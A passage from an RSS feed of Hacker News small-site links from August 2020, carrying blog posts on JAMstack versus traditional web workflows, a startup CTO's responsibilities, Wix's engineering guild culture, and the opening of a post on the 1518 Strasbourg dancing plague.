<p>With the <code>prebuilt</code> approach of JAMstack, we solve this to a great extent. All the required JavaScript along with the markup and styles are already built and served from a content delivery network(CDN). There is no waiting at the browser's runtime about what script and, which page to load.</p>
<p>The heavy lifting is done at once at the build time, which takes the processing time out of the request and eventually uses less computation at the run time.</p>
<p>The sections below show the difference in the build vs load time between the server rendered, SPA and JAMstack applications.</p>
<h3 id="server-rendered">Server Rendered</h3>
<p>In a server rendered application, all the heavy lifting is done by the server. The browser needs to request for a page and the server computes, generates the page. Once done, it sends the page to the browser as part of the response. The browser downloads the page and renders. This cycle repeats for each of the page loads and all happen over the wires all the times.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153515145/fBxG_mmmm.png?auto=format&amp;q=60" alt="image.png"></p>
<h3 id="single-page-applicationspa">Single Page Application(SPA)</h3>
<p>A single page application solves the above problem greatly. The server doesn't handle the page computations, routing and request based serving. But the problem is, lots are happening on the client side. We are relying on the browser and the device power here for all the computations at the run time.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153551324/KWbNo82Xv.png?auto=format&amp;q=60" alt="image.png"></p>
<h3 id="jamstack">JAMstack</h3>
<p>With JAMstack's <code>prebuilt</code> mechanism, the content is already built. As the content was already built, there is no need for an origin server at all. The content can be served from a CDN. It solves both the problems we have seen with the <code>server rendered</code> apps and <code>SPA</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153586296/GxJuCLbu3.png?auto=format&amp;q=60" alt="image.png"></p>
<p>There are several advantages of pre-building the content,</p>
<ul>
<li>Transpile JavaScript and build with markup and style.</li>
<li>Pull data from remote services.</li>
<li>Build C into WebAssembly.</li>
<li>Lint your code for accessibility (<code>Netlify</code> has introduced the build time plug-in system, will see it in the future article of the series).</li>
<li>Shaping up the data that are required by the UI component at the build time.</li>
</ul>
<p>How about the rollback issue we spoke above? We will learn about it shortly.</p>

<p>As we know about the benefit of pre-building the app now, we need to talk a bit about CDN, i.e, content delivery network. There is actually not much advantage, if a prebuilt mark up is served from an origin server. It will be almost similar to the server rendered applications.</p>
<p>Let us take an example. Assume that, an application content is being served from the origin server, <code>abcd.com</code> which is located in some part of the USA. A user like me who is from India wants to access a page from <code>abcd.com</code>. It may be a poor experience for me to render this page on my browser depending on my network speed, hardware capabilities, distance between my browser and the origin server etc. </p>
<p>How about, I have the page(or the content) hosted in my proximity in a secured manner? This where the CDN comes in. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598174766656/DnE3Lu5IT.png?auto=format&amp;q=60" alt="CDN.png"></p>
<ul>
<li>CDN reduces the distance between the users and the website resources.</li>
<li>CDN reduces the amount of data to be transferred using minification techniques.</li>
<li>Helps in cache invalidation so that, users do not see the stale data.</li>
<li>It is secured.</li>
</ul>

<p>I am sure, we have a good ground on the <code>prebuilt</code> content and <code>CDN</code> by now. With that, let us understand some critical differences between a traditional workflow and JAMstack workflow.</p>
<h3 id="traditional-workflow">Traditional workflow</h3>
<p>In a traditional client-server workflow,</p>
<ul>
<li>Developers write code, test, build the <code>application</code>.</li>
<li>Ships the <code>application</code> to a server(<code>origin server</code>).</li>
<li>Users request a resource from the <code>origin sever</code> specifying a URL.</li>
<li>The origin server does the computations, produces the <code>required HTML</code> and send to the user. When the user requests a new resource, the process continues.</li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175113805/9Mo0SqrFv.png?auto=format&amp;q=60" alt="Traditional.png"></p>
<h3 id="jamstack-workflow">JAMstack workflow</h3>
<p>In JAMstack workflow,</p>
<ul>
<li>Developers write code and push to a <code>source repository</code> like git.</li>
<li>A <code>workflow</code> kicks off which start the build to create <code>prebuilt content</code>.</li>
<li>The prebuilt content then gets deployed to a <code>CDN</code>.</li>
<li>Users request for the resources from the <code>CDN</code>(available in proximity) and the prebuilt content is served. No need to reach out to the origin server.</li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175378452/lZL0CT9px.png?auto=format&amp;q=60" alt="JAMstackflow.png"></p>
<p>It is also easy to manage customer expectations with JAMstack. The process of reverting a fix or rolling back to a specific state of the application with the traditional approach is difficult. It requires the process to plan a release, on board developers, tester, devops. Build the entire application again and then finally ship it to the server.</p>
<p>With JAMstack, the workflow is managed very easily. Here is an example from <a target="_blank" href="https://www.netlify.com/">Netlify</a> where all my branch deploys are available for me to make an easy switch and serve the application from it with a single click. We will learn about this workflow in details later in the series.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175471575/qtBQcZxhl.png?auto=format&amp;q=60" alt="image.png"></p>

<ul>
<li><a target="_blank" href="https://www.youtube.com/watch?v=LnYrJ7X00XM">Matt Biilmann - JAMstack at Scale: why pre-built markup is critical</a></li>
<li><a target="_blank" href="https://jamstack.org/best-practices/">JAMstack best practices</a></li>
<li><a target="_blank" href="https://en.wikipedia.org/wiki/Content_delivery_network">What is CDN</a></li>
</ul>

<p>Great, so we know all about JAMstck and the fundamentals of it. Hope it was useful to you. In the next article, we will see the usage of Static Site Generators(SSG) and Headless CMS together. </p>
<p>We will go through the step-by-step way to build a JAMstack application using gatsbyjs, tie it with the git workflow and then deploy it with netlify. We will also learn to manage the content of our app using a CMS. It is going to be a fun learning with all the concepts we have got so far. Stay tuned!</p>

<p>If it was useful to you, please Like/Share so that, it reaches others as well. To get email notification on my latest posts, please subscribe to my blog by hitting the <strong><em>Subscribe</em></strong> button at the top of the page. You can also follow me on twitter  <a target="_blank" href="https://twitter.com/tapasadhikary">@tapasadhikary</a>.</p>
</div></div>]]>
            </description>
            <link>https://blog.greenroots.info/jamstack-vs-traditional-monolithic-workflow-cke6wmr0o00tzxms1dkid7so5</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250794</guid>
            <pubDate>Sun, 23 Aug 2020 09:45:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Know What You Really Need]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250670">thread link</a>) | @jjmea
<br/>
August 23, 2020 | https://proudlywholesome.com/blog/f/are-you-a-ride-or-die-friend | <a href="https://web.archive.org/web/*/https://proudlywholesome.com/blog/f/are-you-a-ride-or-die-friend">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://proudlywholesome.com/blog/f/are-you-a-ride-or-die-friend</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250670</guid>
            <pubDate>Sun, 23 Aug 2020 09:08:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do you have what it takes to be a startup CTO?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24250340">thread link</a>) | @xueyongg
<br/>
August 23, 2020 | https://blog.phuaxueyong.com/post/2020-08-23-what-does-cto-do/ | <a href="https://web.archive.org/web/*/https://blog.phuaxueyong.com/post/2020-08-23-what-does-cto-do/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>The new buzz word in town is the term CTO. As all industries start to embrace technology as part of the core business, the person incharge of this technology will then start to grow in its important. Do you then know what does the role of a CTO entails? Beyond the glamorous term comes with a ton of responsibilities that is paramount for the development of the company across its stages. If you ever inspires to be a CTO yourself someday, this article is for you.</p>
<br>
<blockquote>
<p>You jump off a cliff and you assemble an airplane on the way down. - Reid Hoffman, founder of LinkedIn</p>
</blockquote>

<p>We will be going through these sections:</p>
<br>
<ol>
<li>
<p>What does CTO do across stages of a startup</p>
</li>
<li>
<p>Challenges</p>
</li>
<li>
<p>Key learnings/ opportunities</p>
<ul>
<li>Key habits to get started on</li>
</ul>
</li>
</ol>
<br>
<hr>
<br>
<h2>What does CTO do across stages of a startup</h2>
<br>
<h3>1. Pre-seed stage</h3>

<p>Here you have 0 - 1 developer to basically kick start your entire idea. From git repo initilisation to actually be able to see a UI. Here is where your pre-seed stage will be.</p>
<br>
<ul>
<li>Building the MVP</li>
</ul>

<p>Startup CTOs should be well versed in the tools and technologies available for building MVPs, whether those be web apps, mobile apps, desktop software. They cannot be afraid to get their hands dirty because even if there is a budget to hire a team, the CTO plays backup for any roles that cannot be immediately filled.</p>

<p>You need to create this MVP that can be able to gain real-time user feedback as fast as possible.</p>
<br>
<h3>2. Early startup</h3>

<p>You actually have some intermittent market feedback of a market fit and now you are looking to ramp up your development work. Here, you will look to have 1 - 10 engineers to kick start your development process. I’ve come to believe that different companies sits in this stage for various durations. The size of the engineering team should only appropriately grow in proportion with the performance and traction of the product or service. You do not want to find yourself to be in a situation where you are mass-hiring but each engineers are actually relatively unproductive. You should only ramp up the size of the engineering when you have processes in place to better manage these additional manpower. Truly, many cooks spoil the broth. Listed below are some of the scope of a CTO in the early start phase:</p>
<br>
<ul>
<li>Hiring engineers, IT professionals, and data scientists.</li>
</ul>

<p>Finding and bringing on engineering talent is one of the hardest things for tech startups to do. Hiring for cultural fit at a small startup is challenging. Many developers want to specialize while startups demand generalists.</p>

<p>CTO at a startup has to be good at hiring, onboarding, training, and eventually replacing the company’s technical staffs. Having a proven hiring process and strong network will help.</p>
<br>
<ul>
<li>Figuring out company-wide security</li>
</ul>

<p>When no security policy was done before, it falls onto the lap of CTOs to own the security component, run audits, document security procedures, and train everyone on the basis of it.</p>

<p>Simple security includes a VPN to protect your servers &amp; database from public access.</p>
<br>
<ul>
<li>Product management</li>
</ul>

<p>While the CTOs primary goal is to make the vision of the non-technical product manager a reality, it also means that they have to manage the flow of work into the engineering team. Often times, CTOs take an active role in laying out the product planning process. It is common for startup CTOs to learn both product and technology. Its challenging but learning new things is the norm at startups.</p>
<br>
<ul>
<li>Clear technical debts<br>
A good startup CTO will recognize when poor architecture is slowing down the team, and will step in to settle these technical debts when needed. Eventually these architecture clean ups may be delegated to senior engineers, but it will be likely to fall onto the CTO once in a while.</li>
</ul>
<br>
<ul>
<li>Bug triage</li>
</ul>

<p>First without a Quality Assurance team, it falls onto the CTO to triage bugs, replicate and document down the behavior of the feature, then distribute these bugs to the team for a fix. Deciding how to debug an issue requires detailed understanding of the implementation.</p>
<br>
<ul>
<li>QA and testing</li>
</ul>

<p>Without a proper initial team of quality assurance engineers, the testing layer falls onto the responsibility of the engineering team, headed by the CTO. Planning out the testing layers requires hands-on, hands dirty experiments.</p>
<p>Attached is an article on how to create your testing layer in your company. Check it out <a ref="nofollow" target="_blank" href="https://www.karllhughes.com/posts/testing-layers">here</a>.</p>
<br>
<ul>
<li>DevOps</li>
</ul>

<p>Your servers are your digital assets, and until a DevOps engineer is hired to manage these assets, it will too fall onto the CTO to manage them during the interim period.</p>
<br>
<h3>3. Growth</h3>

<p>Here the company has been gaining traction and is now looking to grow the team from 10 - 100 engineers. The company’s product is starting to mature and people are looking to settle into your company as a possible career-long alternative. In here, then you have to focus on ensuring employee retention and a healthy career progression for each of your employees.</p>
<br>
<ul>
<li>Vendor and customer relationship</li>
</ul>

<p>The CTO has to be clear to figure out what is needed to be done to streamline the company’s technical cost. It could be for the developers processes, or the company’s process through technology.<br>
This is essential if the product is starting to integrate with other softwares or has its own API. The external technical relationships will be the responsibility of the CTO. This is essential if we have power users whom are integrating with us, requesting for some ‘must-have’ features.</p>
<br>
<ul>
<li>Team growth management</li>
</ul>

<p>Managing a team of 5 is different from managing a team of 100. Once the company expands and grow, you will start to hire more specialised engineers which isn’t looking for exciting and challenging tasks. Their focus will just be the traditional benefits, vacation days, and a structured career ladder. The ability to develop the skillset to manage the startup across different life stages will also be the challenge the CTO has to undergo.</p>
<br>
<ul>
<li>Employee retention</li>
</ul>

<p>The early employees whom joined for the challenges may consider other options as the startup phases into a mid-sized startup. As tech workers has plenty of options, its rare to keep one for more than 2, 3 years. The CTO that moves the company across phases has to learn how to retain their employees with strong alignment to the worker’s personal goals.</p>
<br>
<h3>4. Expansion</h3>

<p>Generally, once you are in the phase of expansion, you have to be laser focused to get your technology vision and mission in your company. This does not imply that your company has to utilize the latest technology all the time. Fundamentally, what is your company’s vision and problem statement? Focus on that, and ensure that we are using the best technology available out there to achieve this goal.</p>

<p><img src="https://www.dropbox.com/s/q9pg24tufqwzoog/expansion.png?raw=1" alt=""></p>
<br>
<hr>
<br>
<h2>Challenges</h2>

<p>The challenges a CTO face will be endless. Even as a developer, the amount of challenges you face are endless and everyday you have a ton of todos and blockers to clear. More specifically for CTOs, just as I was reading up on the this aspect, the key challenges faced by all CTOs are primarily hiring and alignment with business people.</p>
<br>
<h3>1. Hiring</h3>

<p>Good engineers that can help you to marry business and technology are hard to find. It will be all the more in demand in times when the world is embracing digital transformation. Even investors are willing to put their millions into savings plans through video calls. It is key to hire not just gifted engineers but those whom will also help shape the culture of the business.</p>
<br>
<h3>2. Focusing on customer engagement</h3>

<p>If you want to create a good technology, it is only just as good as whom the technology is created for. You may create the world’s first robotic arm for minimally invasive surgery but if i’m only washing dishes, why would that be of value to me? You have to benchmark the quality of your product to the utility of your target audience. They have the valuable feedback. In a world where there is a imperfect information, one can only move in the most informed decision; but always with a certain level of uncertainty and risk. Continuously engage with your ‘customers’ and find out what will empower them and set them up to do more with less using your product.</p>
<br>
<hr>
<br>
<h2>5 Key learning opportunities</h2>

<p>Not everyone is born ready for such a big role. It will stretch you, ‘forces’ you to rise up to the occasion and you may even be surprised by what you are able to achieve when you’re placed under the pressurized cooker of your business demands. Generally, CTO is a leadership role. As glamorous as it may sound, it is still in essence just a role. What is most important is the being that is placed in that role. Are you developing yourself to face the bigger problems that are before you?</p>
<br>
<ol>
<li>
<p>Technical knowledge</p>
</li>
<li>
<p>Technical leadership and strategy planning</p>
</li>
<li>
<p>Communication and Mentoring</p>
</li>
<li>
<p>Project management and Operational excellence</p>
</li>
<li>
<p>Sense of entrepreneurship and anticipation of the future</p>
</li>
</ol>

<p>What better way to find out your key areas of learning opportunities than to hear from founders themselves. Here’s a video that To sum this part up</p>

<p>
<iframe src="https://www.youtube.com/embed/tSW-GePDwn4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>
<br>
<hr>
<br>
<h2>TLDR;</h2>

<p>The end goal, the article gives a in-depth glimpse into the scope of a CTO’s day to day. How then can one possibly keep up with this pace of work? Only if you have a clear vision of the possible future. Technology is no longer just a tool for your Business-as-usual. It could possibly shape your future and redesign how life could be, should be, and will be.</p>

<p>From here on, I wish to share with you all a really cool podcast called <a ref="nofollow" target="_blank" href="https://moderncto.io/">Modern CTO</a>. It is a podcast whom CTOs of all different companies will share some of their thoughts, journey, and learnings as CTOs. One thing is common: their level of curiosity for the world around them. Whatever role you are to play, stay curious and be a future explorer!</p>
<br>
<hr>
<br>
<h2>JDs and scope of CTOs across all stages of startup</h2>

<p>Vision &amp; Strategy</p>
<ul>
<li>Setting a vision for how technology will be used in the company.</li>
</ul>

<p>R&amp;D</p>
<ul>
<li>Outline the goals for research and development.</li>
<li>Research any new technologies that may potentially increase our company’s …</li></ul></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.phuaxueyong.com/post/2020-08-23-what-does-cto-do/">https://blog.phuaxueyong.com/post/2020-08-23-what-does-cto-do/</a></em></p>]]>
            </description>
            <link>https://blog.phuaxueyong.com/post/2020-08-23-what-does-cto-do/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250340</guid>
            <pubDate>Sun, 23 Aug 2020 07:52:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Continually Growing Your Engineering Skills While Scaling the Organization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250316">thread link</a>) | @MoradSTR
<br/>
August 23, 2020 | https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture | <a href="https://web.archive.org/web/*/https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.16.2"><div dir="ltr"><div><div id="viewer-3ctl7"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture" data-pin-media="https://static.wixstatic.com/media/66bc35_2ae8788182df4c318552173c029e82b7~mv2.png/v1/fit/w_1872,h_1172,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_2ae8788182df4c318552173c029e82b7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-2ro5n"><span><strong>When you’re part of something extraordinary on a daily basis — you tend to forget how extraordinary it actually is…</strong></span></p><p id="viewer-53nmm"><span>This is why I’ve decided to put on paper, or in a blog post in this case, the story of the <strong>extraordinary Wix Engineering culture</strong>, which I feel lucky to be part of and have helped shape over the past 3 years.</span></p><p id="viewer-dkuqe"><span>I’m Aviva Peisach, Head of backend engineering at Wix. With over 20 years experience in Engineering management and VP R&amp;D roles in various startups and enterprise size organizations I can fully appreciate Wix’s unique investment in engineering and want to share some of the recipe for our secret sauce with you.</span></p><p id="viewer-12mhu"><span>I will not cover all of our engineering practices, since there are too many to fit in a blog post and since they are continually changing and evolving to adapt to our growth and needs.</span></p><p id="viewer-6dr1b">
<span>Instead, I want to focus on our unique formula for investing 20% of our engineering time in professional and community growth.</span></p><p id="viewer-27pfs"><span>Wix is an engineering-focused company: our founders are engineers and about 50% of Wix’s staff is R&amp;D. Since engineering is the heart and soul of Wix (as well as most of our muscle and brain power), we significantly invest in keeping our engineering in best shape by allocating 20% of every developer’s time to enhance their software engineering skills and build a strong, innovative and collaborative engineering community both within and outside of Wix.</span></p><p id="viewer-46gmb"><span>Can you imagine having 1 day a week, every week, allocated to growing your engineering skills? We do so since we genuinely believe (and that’s proven on a daily basis), that investing this time makes us better engineers and significantly increases our velocity, productivity and daily joy of creation.</span></p><p id="viewer-7njmm"><span><strong>So how does it work? How do we invest this valuable time?</strong></span></p><p id="viewer-ff74u"><span>Every Thursday, all engineers per site and profession (e.g. Server, Front End, Mobile, Data science, and QA) meet for half a day of training, knowledge sharing and community building activities.</span></p><p id="viewer-sfo"><span>If we zoom into the server guild, for example (which happens to be the guild I head), every guild day is different, but will typically include:</span></p><p id="viewer-70un7"><span>Project spotlights, where developers share their recent projects, product, architecture and/or technologies they worked with, and challenges they faced, and talk about the lessons they learned.</span></p><p id="viewer-6patl"><span>Themed training: every 3–6 months we select engineering topics we’d like to focus on. For example, in 2019 we picked Performance, API first, JVM Internals, and TDD. Every topic then evolves into a full syllabus which includes talks, workshops, live coding sessions and related use-cases demonstrations. Speaking about that Performance training example, it featured:</span></p><ul><li id="viewer-eo71i"><p>Talks about Performance-oriented design </p></li><li id="viewer-50ub9"><p>Performance pitfalls demos </p></li><li id="viewer-fodaa"><p>Discussions about eventual consistency, product tradeoffs, and scale issues to consider for high Performance </p></li><li id="viewer-d3mf2"><p>Sharing of tools for monitoring and Performance tuning </p></li><li id="viewer-2f9q8"><p>Sharing “war stories” on Performance related issues and lessons from our day-to-day operations.</p></li></ul><p id="viewer-ct429"><span>After that everyone was more of a Performance expert.</span></p><div id="viewer-4jgs7"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture" data-pin-media="https://static.wixstatic.com/media/66bc35_db738fb504a44936b124ae043f93f125~mv2.jpg/v1/fit/w_1621,h_801,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_db738fb504a44936b124ae043f93f125~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-8vtgq"><span>All guild activities are created by our engineers, for our engineers, hence every developer gets to contribute content to our guild days. You do not necessarily need to be an expert in a specific subject, you just need to be passionate about learning and sharing the knowledge you gained.</span></p><p id="viewer-f3m6v"><span>This is where <strong>Tracks come in</strong>: these are typically an hour and a half long events where we have dozens of different activities you can choose from. Typically, in every guild day you get to select one of 4 different track options. A few examples of the variety of our tracks:</span></p><ul><li id="viewer-a3f9k"><p>Mob programming (pair programming on steroids) — this is when you get to code in a group of fellow devs and get to share and learn coding standards, refactoring practices, Intellij tricks and incremental thinking. And come out with a working program. </p></li><li id="viewer-67g41"><p>Design track — where you share a design dilemma (typically one you’ve faced and solved for one of your products) and do a group design for it, discuss considerations, debate on tradeoffs, provide new perspectives and reach suggested design alternatives. </p></li><li id="viewer-n1h8"><p>Town Halls — these are mini unconferences where you can raise any issue / dilemma on your mind. Examples include talking about Mocks vs Stubs and working through questions like “how do I effectively estimate my tasks?” or  “how should we effectively enforce deprecations?”. We also hold group discussions to hear other people’s experiences and insights. Town halls will often suggest guidelines or areas to be addressed by the guild. </p></li><li id="viewer-44t34"><p>Building your professional brand track — where you get to invest and consult on your brand presence — this is a sounding board for your next idea for a tech talk or a blog post. This is where you get feedback from other engineers to help you shape your idea into reality and get more tips on how to grow your engineering brand presence. </p></li><li id="viewer-3vkln"><p>Learn a new coding language — where you get to learn (group-guided or self-guided) together. We had Node, Python, GO, Haskell, and more to come. </p></li><li id="viewer-3629s"><p>Pairing &amp; sharing — where you pair with a developer who’s not in your team and share a recent dilemma or a recent project and either do mutual code review, design brainstorming, or prepare for post mortems. The point is to both gain and provide fresh perspective on your day-to-day dilemmas.</p></li></ul><p id="viewer-5kp3m">And since tracks change on a weekly basis — so much more, any dream you have on something you’d like to learn and practice together — easily becomes a track.</p><p id="viewer-27h86"><span>Every quarter you get to have a guild week. This is a week away from your team — where you get to pair with engineers who are not in your group and work together on tasks and initiatives outside your regular backlog.</span></p><p id="viewer-3mvq4"><span>You can pick a guild week track and here are a few examples for popular tracks:</span></p><p id="viewer-fum50"><span><strong>Infrastructure track</strong> — where you get to contribute and build the next generation of Wix infrastructure, framework &amp; tools, thus both helping to boost overall dev velocity, and give your perspective on usability of the framework</span></p><p id="viewer-al4sb"><span><strong>Join a team track</strong> — where you join a different team and work with them for a week. This allows you to both gain and provide a different perspective on code, developer practices, design, and production challenges. Learn another part of our huge product &amp; gain new friends in the guild.</span></p><p id="viewer-fm2et"><span><strong>OSS track</strong> — Where you help open source our products and infrastructure to contribute to the entire engineering community.</span></p><p id="viewer-34b0b"><span><strong>Academy track </strong>— where you get to work on your next guild talk / workshop or next conference talk (many Guild talks tend to become talks you give in global tech conferences) or work on your blog post. Accompanied by the great minds and mentors from our Wix Academy — helping to boost your talk graphics, stage presence &amp; delivery skills, dry-run and create stunning outcomes.</span></p><p id="viewer-59lcf"><span><strong>Bring your own track</strong> — Have an idea or initiative you’re dying to work on but never have the time to do it? You can bring it to a guild week, pair up with someone, and make it happen.</span></p><p id="viewer-egkvo"><span>So many options to choose from, so many worlds and perspectives to explore, all allowing us to break the routine, grow our engineering skills and experience while innovating, contributing and helping others. A perfect Win-Win-Win.</span></p><p id="viewer-981n8"><span>The Wix Engineering community and guilds exist and evolve beyond the scope of guild days and guild weeks, of course — with active slack channels, newsletters, shared boards and more, we continuously share knowledge and lessons learned. People are always willing to help and consult, which eliminates the fear or uncertainty about who or where to ask.</span></p><p id="viewer-85pl2">Well, initially we canceled all guild activities for a month or two allowing everyone to adjust to the new remote reality. But soon enough we revived all of those activities in a remote format. Guild days are conducted over Zoom, for workshops and tracks we break out to smaller groups via breakout rooms and we try doing something fun on every guild day like bot competitions, ice cream toast sharing, and funny group photos. </p><p id="viewer-5fna8">We also now conduct our guild days &amp; weeks globally allowing everyone to be exposed, contribute, and leverage knowledge across the entire guild and not just on the local site. So indeed, some of the intimacy and the f2f affect are gone, but so is the new reality. Guild days and weeks remain the glue of the guild and allow us all to feel like we are a part of something bigger, like we're closer together - which is even more important now, with the remote reality upon us.</p><p id="viewer-kodj"><span>Having a lively and vibrant engineering community gives each and every member an opportunity to grow and have access to the brilliant minds and experience of our hundreds of talented and passionate engineers.</span></p><p id="viewer-5himf"><span>This post was originally posted on </span><a href="https://medium.com/wix-engineering/continually-growing-your-engineering-skills-while-scaling-the-organization-the-unique-wix-596536b857ff" target="_blank" rel="noopener"><span><u>Medium</u></span></a></p><div id="viewer-89qa6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture" data-pin-media="https://static.wixstatic.com/media/66bc35_3bd01b1f6be0412b8e1488a311bac363~mv2.jpg/v1/fit/w_351,h_351,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_3bd01b1f6be0412b8e1488a311bac363~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-1nd40">This post was written by <strong>Aviva Starovolsky-Peisach</strong>, </p><p id="viewer-e9brg"><span>Server Guild Manager</span></p><p id="viewer-b43n6"><strong>For more engineering updates and insights:</strong></p><ul><li id="viewer-6fijf"><p>Follow us on: <a href="https://twitter.com/WixEng" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.facebook.com/WixEngineering/" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.linkedin.com/showcase/wix-engineering/" target="_blank" rel="noopener"><u>LinkedIn</u></a></p></li><li id="viewer-6mhvr"><p>Visit us on <a href="https://github.com/wix" target="_blank" rel="noopener"><u>GitHub</u></a></p></li><li id="viewer-csdk5"><p><a href="https://www.wix.engineering/subscribe" target="_blank" rel="noopener"><u>Subscribe to our monthly newsletter</u></a></p></li><li id="viewer-1qgpt"><p>Subscribe to our <a href="https://www.youtube.com/WixTechTalks" target="_blank" rel="noopener"><u>YouTube channel</u></a></p></li><li id="viewer-akkj2"><p><a href="https://medium.com/wix-engineering" target="_blank" rel="noopener"><u>Follow our Medium publication</u></a></p></li><li id="viewer-b9lr2"><p>Listen to our podcast on <a href="https://podcasts.apple.com/il/podcast/wix-engineering-podcast/id1503976848" target="_blank" rel="noopener"><u>Apple</u></a>, <a href="https://open.spotify.com/show/5CmjtjpdcKkHDnr0601uYS?si=PcOf7Rx_RUmGojFj5n7CEA" target="_blank" rel="noopener"><u>Spotify</u></a> or <a href="https://podcasts.google.com/?feed=aHR0cHM6Ly9yYW5sZXZpLmNvbS9mZWVkL3dpeF9wb2Qv&amp;ved=0CAAQ4aUDahcKEwjY3bLcy7_oAhUAAAAAHQAAAAAQAQ" target="_blank" rel="noopener"><u>Google</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250316</guid>
            <pubDate>Sun, 23 Aug 2020 07:47:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When People Danced to Death]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250261">thread link</a>) | @indianhistoryy
<br/>
August 23, 2020 | https://worldhistoryinchunks.com/2020/08/23/when-people-danced-to-death/ | <a href="https://web.archive.org/web/*/https://worldhistoryinchunks.com/2020/08/23/when-people-danced-to-death/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-413">
			<!-- .hero -->
	
	<div>
		
<h4>Citizens of Strasbourg danced to death during the summer of 1518 and on one knew the reason behind&nbsp;it</h4>



